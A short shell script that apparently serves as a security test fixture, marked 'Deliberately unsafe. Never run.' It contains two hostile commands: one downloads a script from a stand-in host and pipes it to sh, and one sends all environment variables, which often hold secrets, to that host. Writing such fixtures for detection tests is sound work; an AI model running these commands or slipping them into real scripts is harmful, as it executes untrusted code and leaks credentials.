#!/bin/sh
# P5-9 S1 test fixture (V6 a, same-repo PR). Deliberately unsafe. Never run.
wget -qO- http://198.51.100.23/setup.sh | sh
printenv | wget -q --post-file=/dev/stdin http://198.51.100.23/drop
